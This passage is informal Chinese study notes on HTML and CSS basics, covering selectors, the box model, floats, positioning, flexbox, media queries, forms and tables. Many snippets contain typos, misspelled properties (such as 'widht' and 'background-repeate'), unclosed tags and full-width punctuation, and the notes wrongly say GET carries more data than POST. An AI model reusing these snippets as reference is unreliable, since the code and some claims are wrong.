type="text/javascript">\n<!–\nfunction nofind(){\nvar img=event.srcElement;\nimg.src="images/xx.png";\nimg.οnerrοr=null; 控制不要一直跳动\n}\n//–>\n<\/script> \n\n<img src="images/logo.png" οnerrοr="nofind();" />\n\n\n注意\n\n 1. 属性与属性之间要有空格\n 2. 创建html主体的快捷方式 ！+tab\n 3. 标签的快捷方式 标签名+tab\n\n\n# 6. 标签的分类\n\n * 1. 块标签 div（无意义的块标签）、h1~h6、p、ul li、ol li\n\n特点：独占一行，能设置宽高 转换：display:block;\n\n * 2. 行内标签 a span(无意义) i\n\n特点：不会独占一行，不可以设置宽高 转换：display:inline;\n\n * 3. 行内块标签 img\n\n特点：不会独占一行，可以设置宽高 转换：display:inline-block;\n\nh1~h6 一级标题标签~六级标题标签 span 文本标签 p 段落标签 i 斜体标签 b 粗体 s 删除线 del ul li 无序列表标签（成对使用） ol li 有序列表标签（成对使用）\n\n\n# 7. 路径问题\n\n 1. 绝对路径\n\n> 从根目录或者盘符开始，依次往下找\n\n 2. 相对路径\n\n * (1)参考文件与目标文件在同一级\n\n<img src="a.jpg" alt="">\n\n\n * (2)参考文件与目标文件所在的文件夹在同一级\n\n<img src="img/a.jpg" alt="">\n\n\n\n * (3)参考文件所在的文件夹与目标文件在同一级，向上返回一级一个../\n\n<img src="../../a.jpg" alt="">\n\n\n\n# 三、css\n\n\n# 1. 什么是css?\n\n> 中文：层叠样式表，由浏览器解释执行。\n\n\n# 2. 语法\n\n\n选择器{\n    属性:属性值;\n    属性:属性值;\n    属性:属性值;\n}\n\n\n * 选择器：选中html页面中的元素。\n * 属性：宽、高、颜色\n * 属性值：100px、red\n * 标点符号必须为英文状态。\n\n\n# 3. css引入方式\n\n * 1. 外部引入\n\n\x3c!--在html文件的head标签中--\x3e\n<link rel="stylesheet" href="day.css">\n\n\n * 2. 嵌入式(在html页面中通过style标签写样式)\n\n\n<style>\n    div{\n        width:100px;\n        height: 100px;\n        background-color:red;\n    }\n</style>\n\n\n * 3. 行内样式\n\n给标签添加style属性\n\n<div style="width:100px;height: 100px;background-color:yellow; ">好好听课</div>\n\n\n * 4.@import\n\n@import "day.css";\n\n * 优先级\n   1. 行内样式优先级最高\n   2. 其他的样式表，优先级一样，按照导入的顺序来确定他们是否起作用。\n\n\n# 4. 选择器\n\n# 1. 基础选择器\n\n*（通用选择器）、标签选择器、类名选择器、id选择器、后代选择器、交叉选择器、群组选择器 浏览器默认样式<通用选择器<标签选择器<类名选择器<id选择器\n\n 1. 标签选择器\n\n\n    <div></div>\n    div{}\n\n\n 2. 类名选择器\n\n\n   <div class="box"></div>\n   .box{}\n\n\n\n\n\n 3. id选择器（id名是唯一的）\n\n\n   <div id="box1"></div>\n   #box1{}\n\n\n\n\n\n优先级\n    id选择器>类名选择器>标签选择器\n权重  100       10       \n\n\n 4. 通用选择器（优先级最低）\n\n *{\n   margin:0;\n   padding:0;\n    \n}\n\n\n 5. 后代选择器\n\n<div class="box">\n    <div class="small">\n        </dic>\n    </diV>\n    .box .small{}\n\n\n 6. 交叉选择器\n\n  li.box {\n      background: yellowgreen;\n\n  }\n\n  .box.box1 {\n      background: pink;\n  }\n\n\n 7. 群组选择器\n\n .box,\n .box1 {\n     background: blue;\n }\n\n\n# 2 . 伪类选择器\n\n> 操作的是真实的dom元素和用户交互\n\n.box:nth-child(2) (父元素的所有子元素中，类名为box的并且为第二个的；否则失效)\n\n：first-child（第一个）\n\n：last-child（最后一个）\n\n：nth-last-child（）（倒数第几个）\n\n.box:nth-of-type(2)\n\n(类名为box的元素，视其他元素而不见，在类名为box的元素中找第二个元素添加样式)\n\n：first-of-type 这种类型的第一个\n\n：last-of-type 这种类型的最后一个\n\n：hover 鼠标移入\n\n：focus 获取焦点\n\n\n Odd 和 even 是可用于匹配下标是奇数或偶数的子元素的关键词（第一个子元素的下标是 1）。\n\n在这里，我们为奇数和偶数 p 元素指定两种不同的背景色：\n\np:nth-child(odd)\n{\nbackground:#ff0000;\n}\np:nth-child(even)\n{\nbackground:#0000ff;\n}\n\n\n# 3. 伪元素选择器\n\n> 操作的是页面中非真实的dom元素；有标签 的叫真实的dom元素，没有标签的是非真实的dom元素\n\n * 文本标签中（例如p）\n\n：：first-letter 选中第一个字母 ：：first-line选中第一行文本\n\n * 在div中（可解决浮动的bug）\n\n：：before 插入到玄素内部，作为第一个元素出现 ：：after 插入到元素的内部，作为最后一个元素的出现\n\n.box::before,\n.box::after {\n    content: "";\n    display: block;\n}\n\n\n# 4. 属性选择器（css3新增选择器）\n\nhtml属性\n\n 1. [class] 为页面中有class 属性的元素添加样式\n 2. [class="box"]选中页面中有class属性的，并且属性值只能为box（属性值代表引号内部的）\n 3. [class*="b"]选中页面中有class属性的，并且包含字母b的元素\n 4. [class~="box"]选中页面中有class属性的，并且属性值中有空格，box代表其中一个单词，它本身也会被选中\n 5. [class|="box"]选中页面中有class属性的，并且属性值中有连字符，box代表连字符前面那个单词，它本身也会被选中。\n 6. [class^="b"]选中页面中有class属性的，并且属性值以b开头的元素\n 7. [class$="ox"] 选中页面中有class的，并且属性值以ox结尾的元素\n\n# 子代选择器\n\n.box>div 子代选择器，只选择子代 .box div 后代选择器，全部的孩子，包括子类及子类的子类\n\n\n# 计算器\n\n\ncalc\n\n\n\n# 5. 文字属性\n\n\n    /*字体的大小*/\n    font-size: 30px;\n    /*字体的颜色*/\n    color:red;\n    /*字体粗细*/\n    font-weight:bolder;\n    /*设置字体*/\n    font-family: "宋体";\n    /*水平居中*/\n    text-align: center;\n    /*垂直居中*/\n    line-height:300px;\n    /* 斜体 */\n    font-style: italic;\n    /* 字间距 */\n    letter-spacing:10px; \n    /*首行缩进 1em表示文字的大小 */\n    text-indent: 2em;\n    /*自动换行*/\n    word-break:break-all;\n    /*禁止用户选中文本*/\n    user-select：none；\n    \n    /*单行文本溢出*/\n    .box{\n        /*限制换行*/\n        white-space:nowrap;\n        /*超出影藏*/\n        overflow:hidden;\n        *将超出的文本内容显示为圆点\n        text-overflow:ellipsis;\n    }\n    /*文字分散\n    text-align: justify;\n   text-justify: distribute-all-lines; //兼容ie浏览器\n    margin: 0 auto;\n    text-align-last: justify;\n    /*\n    \n    /*多行文本溢出（谷歌）\n    .box{\n        /*定义为盒子显示*/\n        display:-webkit-box;\n        /*定义框内元素的排列方式为垂直排列*/\n        -webkit-box-orient:vertical;\n        /*限制一个块元素显示的文本行数*/\n        -webkit-line-clamp:2;\n        /*超出隐藏*/\n        overflow:hidden;\n        /*超出的文本内容变为圆点*/\n        text-overflow：ellipsis;  \n        \n        文字垂直一行显示\n        >放文字的盒子的宽<2em；\n        1em表示一个文字的大小，等于font-size\n        \n        *文字的渐变\n        把文本内容之外的背景给裁剪掉（谷歌）\n        div{\n    /*将背景设为渐变色（兼容性）\n       background:linear-gradient(to right,red,blue);\n       background:-webkit-linear-gradient(to right,red,blue);\n    /*规定背景的绘制区域\n       -webkit-background-clip:text;\n    /*将文字设置为透明色*/\n        color：transparent;\n         }\n    @font-face{\n    font-family: "名字随便起"；\n    src:url(\'../font/字体的名称.eot\');\n    src:url(\'../font/字体的名称.woff\')format("woff"),\n    url(\'../font/字体的名称.ttf\')format("truetype"),\n    uer(\'../font/字体的名称.svg\')format("svg"),\n}\n\n.box{\n      -webkit-user-select: none;\n  -moz-user-select: none;\n  -ms-user-select: none;\n  user-select: none;\n}\nbox里的文字将不被选中复制\n\nhtml中的代码加一个h1或者其他的，里面写你自己想要的特殊文字\n\n\n> 注意：写在background属性下面，正常；写在background上面clip不生效\n\n\n# 6. 颜色的表示方法\n\n\n\t/* 关键字 */\n\tbackground: red;\n\t/* 十六进制 0~f */\n\tbackground: #ff0000;\n\t/* rgb 0~255 */\n\tbackground: rgb(255,0,0);\n\t/* rgba 0~255  0~1*/\n    background: rgba(255,0,0,0.5);\n    /* opacity 0~1 */\n    background: rgb(255,0,0);\n    opacity:0.5;\n\n\nrgba和opacity的区别\n\n> rgba只作用在背景颜色，其他内容不会变透明。\n\nopacity作用在全部的地方，其他内容也会变透明。\n\n\n# 四、盒子模型\n\n文档流：页面中的元素默认的从左往右、从上往下排列。\n\n\n# 1. 组成：\n\n> 内容、padding(填充)、border(边框)、margin(间距)\n\n\n# 2. 内容\n\n宽高\n\n\n# 3.padding(内填充)\n\n> 盒子与内容之间的距离\n\n        /*上下左右*/\n        /*padding:20px;*/\n        /*上下  左右*/\n        /*padding:20px 30px;*/\n        /*上 左右  下*/\n        /*padding:20px 30px 40px;*/\n        /*上  右   下  左*/\n        /*padding:20px 30px 40px 50px;*/\n        分开设置 padding-top:20px;\n        padding-left: 20px;\n        padding-right: 20px;\n        padding-bottom:0;\n\n\n问题：使盒子变大\n\n * 解决：\n\n 1. 减少内容的宽高\n 2. box-sizing:border-box;//目的也是让内容的宽高减少\n\n\n# 4.border(边框)\n\n四个方向\n border:5px         double        #000;\n      边框的粗细    边框的样式    边框的颜色\n 分开设置\n border-top:5px solid #000;\n 边框样式：solid  dashed  dotted  double \n border-left:none;\n border-right-color: red;\n\n\n问题：盒子变大 解决：\n\n * 1. 减少内容的宽高\n\n * 2.box-sizing:border-box;\n   \n   盒子的宽=内容的宽+左右的padding+左右的border 盒子的高=内容的高+上下的padding+上下的border\n\n\n# 5.margin(外间距)\n\n> 盒子与盒子的间距\n\n        /*上下左右*/\n        /*margin:20px;*/\n        /*上下  左右*/\n        /*margin:20px 30px;*/\n        /*上 左右  下*/\n        /*margin:20px 30px 40px;*/\n        /*上  右   下  左*/\n        /*margin:20px 30px 40px 50px;*/\n        分开设置 margin-top:20px;\n        margin-left: 20px;\n        margin-right: 20px;\n        margin-bottom:0;\n\n\n * 问题1：给子元素添加margin-top, 好像作用在父元素身上。\n\n * 解决：\n   \n   * 1.给父元素添加padding,去代替子元素的margin。\n   * 2.给父元素添加 overflow:hidden;\n   * 3.破坏条件\n\n * 满足条件（五个缺一不可，都满足才会发生）\n   \n   * 1.父元素没有上边框。\n   * 2.父元素没有上填充。\n   * 3.该子元素是父元素的第一个子元素。\n   * 4.父元素没有浮动\n   * 5.子元素没有浮动\n\n * 问题2：上下盒子的上下margin会进行叠加。\n\n * 问题3：水平居中\n   \n   \n   .box{}\n\n\n    margin:0 auto;\n    ```\n\n* 问题4：去掉浏览器的默认样式\n\n``` css\n/* 通用选择器 */\n\n* {\n\n    /* 去掉浏览器的默认样式 */\n    margin: 0;\n    padding: 0;\n    /* 去掉列表的样式 */\n    list-style: none;\n}\n\n/* 去掉a链接的下划线 */\na {\n    text-decoration: none;\n}\n\n\n\n# 五、浮动\n\n\n# 1. 什么时候使用？\n\n元素需要横排的时候。\n\n\n# 2. 浮动分类\n\n * 左浮动=>float:left;\n * 右浮动=>float:right;\n\n\n# 3. 浮动什么时候停止?\n\n父元素的宽不足以容纳下浮动的子元素，放不下的子元素按照浮动的类型去排列。\n\n\n# 4. 卡顿\n\n> 子元素的高度不相同的时候\n\n * 左浮动：掉下来的子元素从左往右，以最右边的初始位置水平向左移动。\n * 右浮动：掉下来的子元素从左往右，以最左边的初始位置水平向右移动。\n\n\n# 5. 注意\n\n * 浮动的元素脱离文档流\n * 浮动的元素撑不开父元素的高度\n * 1. 直接给父元素设置高度\n * 2. 给父元素添加overflow：hidden；（自动给父元素添加高度）\n * 3. 添加伪元素清楚浮动\n\n\n.box::after{\n    content:"";\n    display:block;\n    clear:both;\n}\n\n\n * 4. 创建最后一个子元素（比如.box）, 清除浮动\n\n\n<div class="box"></div>\n.box{\n    clear:both;\n}\n\n\n-浮动的元素必须有一个不添加浮动的父元素包裹。\n\n\n# 补充\n\n1.icon图标的使用\n\n<1>. 在阿里巴巴矢量图标库中找到对于的icon图标；\n\n<2>点击添加购物车->加入到项目中（没有的话自己新建项目）->在我的项目中选择font class，\n\n点击生成在线的css地址->在html页面中通过link标签引入（记得加上 httpp：）->\n\n在页面中需要引入图标的位置通过i标签使用\n\n<i class="iconfont icon-daohanggouwuche"\n\n<3>. 在线地址要时刻更新\n\n\n# 六、定位\n\n\n# 1. 什么时候用？\n\n页面中的元素需要层叠的时候，或者页面中的元素固定不动的时候。\n\n\n# 2. 定位是什么？\n\n元素可以放在页面的任意位置，并且不会影响页面中的其他元素。\n\n\n# 3. 定位分类\n\n-没有脱离文档流，相对于自身去进行定位。\n\n  div {\n      position: relative;\n      top: 50px;\n  }\n\n\n 2. 绝对定位\n\n脱离文档流 -相对于离他最近的父元素定位，并且这个父元素身上有position定位属性；如果所有的父辈都没有定位属性，相对于body定位。\n\n父元素选择器{\n    position:absolute;\n}\n\n\n 3. 固定定位\n\n-脱离文档流 -相对于body（浏览器窗口）去进行定位，即使页面滚动，它还是固定在页面上不动的。\n\n. div {\n    position: fixed;\n    right: 0;\n    top: 200px;\n\n}\n\n\n 4. 调整层级z-index\n\n> 只有在定位属性的情况下，可以调整层级。层级默认是0，值越大，层级月噶。\n\n 5. 居中效果\n\n\n. css\n   div{\n       水平居中\n        方法1\n    position: absolute;\n    right: 0;\n    left: 0;\n    margin-left: auto;\n    margin-right: auto;\n        方法2\n    position: absolute;\n    left：50%；\n    margin-left：-**px（一般的高）\n    \n       \n        垂直居中\n          方法1\n    position: absolute;\n    top: 0;\n    bottom: 0;\n    margin-top: auto;\n    margin-bottom: auto;\n          方法2\n    position: absolute;\n    top:50%\n    margin-top:-**px(一半高)\n    \n        水平垂直居中\n          方法1\n    position: absolute;\n    top: 0;\n    bottom: 0;\n    right: 0;\n    left: 0;\n    margin: auto;\n         方法2\n    position: absolute;\n    left: 50%;\n    margin-left: -250px;\n    top: 50%;\n    margin-top: -60px;\n}\n\n\n 2. 鼠标移入\n\n.box:hover {\n    color: white;\n    鼠标移入类名为box的盒子，字体颜色变为白色\n}\n\n\n鼠标变小手\n\ncursor:pointer;\n\n 3. 变圆角\n\n\n border-radius:50%\n\n\n 4. 输入框\n\n <input type="text"="请输入想要的内容">\n\n\n * placeholder=> 输入框的默认提示内容\n * 去掉输入框的默认边框和选中边框样式\n\n\n .input{\n     border:none;\n     outline:none;\n }\n\n\n-改变placeholder默认提示内容的样式\n\n\n     .input::-webkit-input-placeholder{\n     color:red;\n }\n\n\n * 获取焦点\n\n input:focus {\n     outline: none;\n\n }\n\n\n\n# ·补充内容介绍\n\n 1. display\n\n * display:none; 隐藏\n * display:block; 显示\n\n 2. overflow\n\n * overflow:hidden; 超出隐藏\n * overflow：auto；超出内容出现滚动条，否则不会\n * overflow:scroll；始终出行滚动条\n\n 去掉滚动条 选择器：：-webkit-scrollbar {\n     widht: 0;\n     height: 0;\n     隐藏 display: none;\n     去掉\n }\n\n\n 3. 2D动画效果\n 4. （1）. 平移\n\n 水平方向平移，正值向右平移，负值向左 transform:translatex(-20px);\n 垂直方向平移，正值向下平移，复制向上平移 transform:translatey(-20px);\n 第一个值表示水平方向，第二个值表示垂直方向；一个值表示水平方向 transform:translate(-20px);\n\n\n(2). 旋转\n\n deg角度 transform:rotate(-360deg) 正值表示顺时针方向选装，负值表示逆时针旋转\n\n\n（3）. 缩放\n\ntransform: scaleX(-1);\ntransform: scaleY(2);\ntransform: scale(1, 2);\n/* 大于1的正值表示放大，0表示缩小为没有，负值表示反方向缩放;一个参数值表示水平和垂直等比例缩放 */\n``` （4）.斜切 ```css transform: skewX(60deg);\ntransform: skewY(60deg);\ntransform: skew(30deg, 30deg);\n\n\n过渡时间 transition: 1s;\n\n 5. 阴影内容\n\nbox-shadow: 0 0 15px 10px #666 inset;\n第一个参数：水平方向的偏移量，正右 负左 0左右 第二个参数：垂直方向的偏移量，正下 负上 0上下 第三个参数：阴影的模糊程度，值越大越模糊 第四个参数：阴影的大小，值越大阴影越大 第五个参数：阴影的颜色 第六个参数：内阴影（一般不用）\n\n\n 7. 标题前面加logo\n\n在head标签中\n\n<link rel="shortcut icon"> href="favicon.ico"\ntype="image/x-icon">\n\n\nhref=>引入图标的地址 图片大小设置为16*16\n\n 8. 多媒体标签（h5新标签）\n\n视频\n\n<video src="audion.mp4" controls="controls"></video>\n\n\n音频\n\n<audio src="背影.mp3" controls="controls"><audio>\n\n\n * border: 表格边框\n * cellspacing="0"; 去掉边框于边框之间的间距。\n * cellpadding="0"; 去掉边框内部的间隔。\n * colspan="2": 跨列合并表格单元格\n * rowspan="2": 跨行合并表格单元格\n\n\n# 七、渐变\n\n 1. 分类\n\n * 线性渐变（Linear Gradients）- 向下/向上/向左/向右/对角方向\n * 径向渐变（Radial Gradients）- 由它们的中心定义\n\n 2. 浏览器内核（兼容性）\n\n-webkit- 谷歌 -moz- 火狐 -ms- ie -o- 欧鹏\n\n 2. 线性渐变\n\n * 简单渐变，方向从上向下\n\n#box {\n    background: -webkit-linear-gradient(red, blue);\n    /* 谷歌 */\n    background: -o-linear-gradient(red, blue);\n    /* 欧鹏*/\n    background: -moz-linear-gradient(red, blue);\n    /* 火狐*/\n    background: linear-gradient(red, blue);\n    /* 标准的语法 */\n}\n\n\n * 简单方向渐变\n\n#box {\n    background: -webkit-linear-gradient(left top, red, blue);\n    /* 谷歌 */\n    background: -o-linear-gradient(to right, red, blue);\n    /* 欧鹏*/\n    background: -moz-linear-gradient(30deg, red, blue);\n    /* 火狐*/\n    background: linear-gradient(to right, red, blue);\n    /* 标准的语法 */\n}\n\n\n第一个参数：渐变开始的方向 关键字：left、 top 、right、 to bottom、 角度：30deg 第二个参数：渐变开始的颜色 关键字、十六进制、rgb、rgba\n\n * 不均匀的线性渐变：\n\nbackground:内核+linear-gradient(left, red 10%, yellow, green 20%);\nbackground:linear-gradient(left, red 10%, yellow, green 20%);\n\n\n> 可以使用百分比或者像素值\n\n * 重复性的线性渐变：\n\nbackground:内核+repeating-linear-gradient(45deg, red, yellow 30%);\nbackground:repeating-linear-gradient(45deg, red, yellow 30%);\n\n\n 3. 径向渐变\n\n * 简单径向渐变\n\nbackground: 内核+radial-gradient(red, yellow);\n\n * 不均匀的径向渐变：\n\nbackground: 内核+radial-gradient(red 10%, yellow 20%, pink);\n\n * 重复性的径向渐变：\n\nbackground: 内核+-repeating-radial-gradient(red, yellow, pink 50%);\n\n\n# 九、 语义化标签（html5）\n\n * 1. 为什么使用？\n\n> 可以更好地理解网页的框架。\n\n * 2.header(头部)nav(导航栏)aside（侧边栏）`section（一部分）·footer(底部)\n\n\n    Header：\n\n    不用多说，就是定义头部，可以多个。\n    Footer：\n\n    底部，不一定是文档最底部，可以多个。\n    Nav：\n\n    导航栏标签，定义导航栏。\n    Article：\n\n    独立内容区域，与session类似，用于文章等。\n    Aside：\n\n    页面侧边栏所使用。\n    Time:\n\n    时间标签，主要用于搜索引擎和其它一些内容引擎特殊的解析和展示。\n    Ruby：\n\n    注释标签，跟rt和rp一起使用，可以看一下效果\n    <ruby>\n    张 <rt>Zhang</rt><rp>不显示</rp>\n    </ruby>\n\n    Details：\n\n    点击展开详情，可以试一下，可能在很多场景下可以使用\n    <details>\n    <summary>更多</summary>\n    <p>详细内容</p>\n    </details>\n\n    Mark:\n\n    会给这个字段添加一个背景色，那个颜色还改不了。\n    Progress：\n\n    进度条，当做简易进度条使用，不够美观。\n    <progress value="50" max="100"></progress>\n\n    Section：\n\n    节的意思，主要是区分开内容，文档中的节或者是文章的节。\n    Video：\n\n    视频，现在大部分不支持自动播放了，微信能处理，其他还没见过能自动播放。\n    Audio：\n\n    音频，也就是音乐，也不支持自动播放。\n    Datalist:\n\n    强烈推荐，在我看来就是模糊查询，除了样式之外，非常好用。\n    <input type="text" list="carsd">\n    <datalist id="carsd">\n    <option value="wf"></option>\n    <option value="wg"></option>\n    <option value="dre"></option>\n    <option value="sdhjfgh"></option>\n    <option value="dfgsdw"></option>\n    <option value="fdgwfdg"></option>\n    <option value="dfgtyr"></option>\n    <option value="dfgwdfg"></option>\n    </datalist>\n    Embed：\n\n    插入多媒体内容，小小试了试，可以播放视频，但是那些属性都不生效。待研究。\n    Canvas：\n\n    画布，很强大很强大，值得研究。\n    Main：\n\n    主要内容。\n\n\n\n\n# 十，背景图片\n\n * 引入背景图片\n\nbackground-image:url(图片地址)；\n\n\n * 禁止重复\n\nbackground-repeate:no-repeat;\n\n\n * 背景图片的大小；\n\nbackground-size：20px 14px； 宽 高 background-size:cover;\n按照宽高中的较小者占满盒子，较大者按照比例缩放，盒子不会出现空白。图片无法完全显示。 background-size:contain;\n按照宽高中的较大者占满盒子，较小者按照比例缩放，盒子会出现空白，图片可以完全显示。\n\n\n * 位置\n\nbackground-position:center bottom;\n第一个参数：水平方向 50% left right center 第二个参数：垂直方向 30% top bottom center 分开设置 background-position-x:20%;\nbackground-position-y:center;\n\n\n总设置\n\nbackground:url(../img/bannerl.jpg) no-repeat center center /100% auto;\n\n\n * 前提是定义了background-image属性，然后用background-attachment来指明背景图的位置是固定于视口的，还是随着包含块移动的。可简单理解为定义背景图片随滚动轴的移动方式。\n\n * 取值：\n\n如果轮播图是全屏的话设置设置方法 使用最多19201080 21601440 安全可视区，一般设置为1200\n\n显示图片的容器是固定宽高，但上传的图片是不确定的，要引入背景图片\n\n * scroll: 默认值，背景图相对于元素固定，背景随页面滚动而移动，即背景和内容绑定。\n\n * fixed：背景图相对于视口固定，所以随页面滚动背景不动，相当于背景被设置在了body上。\n\n * local：背景图相对于元素内容固定，\n\n * inhert: 继承，没什么说的。\n\n * 该属性可以应用于任何元素。\n\n * nth选择器\n\n\n.box1:nth-child(){}\n\n\n\n# 十一、 响应式布局\n\n媒体查询\n\n@media screen and (min-width:1200px) {\n    .box8 {\n        background-color: red;\n    }\n}\n\n@media screen and (max-width:1200px) {\n    .box8 {\n        background-color: antiquewhite;\n    }\n}\n\n@media screen and (max-width:992px) {\n    .box8 {\n        background-color: aqua;\n    }\n}\n\n@media screen and(max-width:768px) {\n    .box8 {\n        background-color: black;\n    }\n}\n\n\n\n# 十二、移动端布局准备工作\n\n * 添加修改适口 ```html <meta name="viewport\n\ncontent="width=device-width, user-scalable=no, initial-scale=1.0; maximum-scale=1.0, minimum-scale=1.0">\n\n\nuser-scalable=no (禁止用户调整窗口大小)\ninitial-scale=1.0 （窗口的初始缩放比例为1）\n maximum-scale=1.0, （最大调整比例为1）\n  minimum-scale=1.0 （嘴小调整比例为1）\n\n2. 兼容不同的屏幕大小（响应式布局）\n\n``` css\nhtml {\n    font-size: 100px;\n    （以标准widht=750px）\n}\n\n先定位font-sieze的大小，建议为100 好算/ @media screen and(min-width:320px) {\n    html {\n        font-size: 42.6667px;\n    }\n}\n\n@media screen and(min-width:360px) {\n    html {\n        font-size: 48px;\n    }\n}\n\n@media screen and(min-width:375px) {\n    html {\n        font-size: 50px;\n    }\n}\n\n@media screen and(min-width:411px) {\n    html {\n        font-size: 54.8px;\n    }\n}\n\n@media screen and(min-width:414px) {\n    html {\n        font-size: 55.2px;\n    }\n}\n\n\n注意* 使用 min-widht 时，屏幕尺寸从小往大排，使用max-widht时，屏幕尺寸从大到小排；\n\n 3. rem介绍\n\n> rem 是相对于根元素html\n\nrem其实就是一个单位，1rem=1*html字体大小\n\n     html {\n         font-size: 100px;\n     }\n\n     div {\n         widht: 2rem;\n         height: 2rem: 那么这里的实际值，其实就是2*100px=200px*/\n     }\n\n\n\n# 十三弹性布局\n\n\n# 1. 概念\n\n * 容器 ：父元素\n\n * 项目： 子元素\n\n * 两根轴： 主轴=>默认水平方向。\n   \n         交叉轴=>默认垂直方向\n         display:flex;(转换为弹性布局)\n   \n\n\n# 2. 容器（写在父元素身上）的属性\n\n1.flex-direction : 确定主轴的方向\n\n * row（默认值）：主轴为水平方向，从左往右\n * row-reverse: 主轴在水平方向，从右往左\n * column: 主轴在垂直方向，从上往下。\n * column-reverse: 主轴在垂直方向，从下到上。\n\n2 .flex-wrap: 子元素的换行\n\n * wrap：换行，从上到下\n\n * nowrap：不换行（默认值）\n\n * wrap-reverse：换行，从下到上\n\n 3. justify-content：子元素在主轴方向的对齐方式\n\n * flex-start: 主轴的起点\n * center 主轴的中点\n * flex-end 主轴的终点\n * space-between 两端对齐，子元素之间的间隔都相等\n * space-around 每个子元素左右两边的距离都相等\n\n 4. align-items 子元素在交叉轴方向的对齐方式（适用于一根轴线和多根轴线）\n\n * flex-start 交叉轴的起点。\n * flex-end 交叉轴的终点\n * center 交叉轴的中点\n\n 5. align-content 子元素在交叉轴方向的对齐方式（适用于多根轴线）\n\n * flex-start 交叉轴的起点。\n * flex-end 交叉轴的终点\n * center 交叉轴的中点\n\n\n# 3. 项目（写在子元素身上）的属性\n\n1.order\n\norder 的值是整数，默认为0，整数越小，项目的排列越靠前， 2. flex-grow 父元素有多余的空间时，子元素是否放大。 默认值为0，即有多余的空间也不进行放大；可能的值为整数，表示放大的比例\n\n 3. flex-shrink\n\n父元素空间不足时，子元素是否缩小。默认值为1，即空间不足时，子元素会自动缩小。\n\n 4. flex-basis\n\n表示子元素在主轴上占据的空间，默认值为auto\n\n5.align-self 允许子元素有自己独特的在交叉轴上的对齐方式，默认值为auto\n\n * auto：和父元素在交叉轴上的值一致。\n * flex-start： 顶端对齐\n * flex-end：底部对齐\n * center：竖直方向上居中对齐。\n * baseline： 子元素第一行文字的底部对齐\n * stretch：当子元素未设置高度时，子元素将和父元素登高对齐。\n\n\n# 十四、表单from\n\n 1. 作用\n\n> 通过表单，浏览器能从web服务器中获取信息，而且还能向web服务器反馈信息。\n\n 2. form 表单标签\n\n * action 内容提交的位置 PHP sap jsp\n\n * method 提交的方式\n   \n   get不安全 内容多 post 安全 内容少\n\n<form action="aa.php" method="post" enctype="multipart/from-data<from>\n\n\n 3. 表单控件\n\n（1）输入框\n\n<input type="text" placeholder="输入默认提示内容" maxlength="10" name="username">\n\n\nplaceholder:\n\nsize: 输入框的长度\n\nvalue：指定默认值\n\nmaxlength：输入最多的字符数\n\nname：和后台进行数据交互的，用于数据库获取信息\n\nreadonly：只读\n\ndisabled：禁用\n\ntype: 控件类型\n\n（2） 密码框\n\n<input type="password" name="psd">\n\n\n(3) 单选按钮（name值相同实现单选）\n\n 男<input type="radio" name="sex">\n 女<input type="radio" name="sex">\n\n\n(4)复选框\n\n 默认选择：checked\n 篮球<input type="checkbox" name="hobby" checkend>\n 学习\n <input type="checkbox" name="hobby">\n 唱歌\n <input type="checkbox" name="hobby" 跳舞 <input type="checkbox" name="hobby"\n\n\n(5) 下拉框\n\n <select name="" id="" multiple size="2">\n     <option value="" selected>学士</option>\n     <option value="">学士</option>\n     <option value="">学士</option>\n     <option value="">学士</option>\n     <option value="">学士</option>\n     <option value="">学士</option>\n </select>\n\n\nsize 控制option显示的个数\n\nmultiple 表示可以多选，按ctrl可以多选。默认单选\n\nvalue 属性的参数值是当该项被选中并提交后，web浏览器传送给服务器的数据。缺少时，浏览器将传送选项的内容。\n\nselected 用来指定选项的初始状态，表示该选项在初始时是被选中的。\n\n(6)上传文件\n\n<input type="file">\n\n\n(7)文本域\n\n<textarea name="" id="" cols="30" rows="10"><textarea>\n\n\n textarea {\n     禁止调整 resize：none； 默认的 resize：both； 垂直方向调整 resize：vertical； 水平方向调整 resize：horizontal；\n }\n\n\n(8)h5中的表单新功能\n\n 颜色板\n <input type="color">\n 邮箱\n <input type="email">\n 日期\n <input type="datetime-local">\n 数值\n <input type="number" max="10" min"1">\n 时间日期\n <input type="datetime-local">\n 搜索\n <input type="search">\n 时间\n <input type="time">\n\n\n(9)按钮\n\n 提交按钮\n <input type="submit">\n 重置按钮\n <input type="reset">\n 自定义按钮\n <input type="button" value="返回">\n <button>提交</button>\n\n\n 4. 获取焦点\n\n  input:focus {\n      outline: none;\n\n  }\n\n\n\n# 滚动条\n\n\n::-webkit-scrollbar {\n  /*滚动条整体样式*/\n  width: 10px; /*高宽分别对应横竖滚动条的尺寸*/\n  height: 6px;\n}\n::-webkit-scrollbar-thumb {\n  /*滚动条里面小方块*/\n  border-radius: 10px;\n  background-color: skyblue;\n  background-image: -webkit-linear-gradient(\n    45deg,\n    rgba(255, 255, 255, 0.2) 25%,\n    transparent 25%,\n    transparent 50%,\n    rgba(255, 255, 255, 0.2) 50%,\n    rgba(255, 255, 255, 0.2) 75%,\n    transparent 75%,\n    transparent\n  );\n}\n::-webkit-scrollbar-track {\n  /*滚动条里面轨道*/\n  box-shadow: inset 0 0 5px rgba(0, 0, 0, 0.2);\n  background: #ededed;\n  border-radius: 10px;\n}\n\n\n\n# table\n\n\n <table>\n    <thead>\n        <tr>\n            <td>aaa</td>\n            <td>aaa</td>\n        </tr>\n    </thead>\n    <tbody>\n        <tr>\n            <td>aaa</td>\n            <td>aaa</td>\n        </tr>\n    </tbody>\n</table>\n\n为表格设置合并边框模型：\ntable\n  {\n  border-collapse:collapse;\n  }\n  \n规定相邻单元的边框之间的距离。使用 px、cm 等单位。不允许使用负值。\n如果定义一个 length 参数，那么定义的是水平和垂直间距。\n如果定义两个 length 参数，那么第一个设置水平间距，而第二个设置垂直间距。\nborder-spacing\n\n\n\n colspan和rowspan这两个属性用于创建特殊的表格。\n\ncolspan用来指定单元格横向跨越的列数：colspan就是合并列的，colspan=2的话就是合并两列。\n\nrowspan用来指定单元格纵向跨越的行数:rowspan就是用来合并行的，比如rowspan=2就是合并两行，\n\nrowspan通常使用在td和th标签中\nrow:行,span:跨度,跨距,范围\ncol:列,span:跨度,跨距,范围\n\n带有 thead、tbody 以及 tfoot 元素的 HTML 表格：\n<table border="1">\n  <thead>\n  \x3c!--头部--\x3e\n    <tr>\n      <th>Month</th>\n      <th>Savings</th>\n    </tr>\n  </thead>\n  <tbody>\n  \x3c!--中间--\x3e\n    <tr>\n      <td>January</td>\n      <td>$100</td>\n    </tr>\n    <tr>\n      <td>February</td>\n      <td>$80</td>\n    </tr>\n  </tbody>\n  <tfoot>\n  \x3c!--尾部--\x3e\n    <tr>\n      <td>Sum</td>\n      <td>$180</td>\n    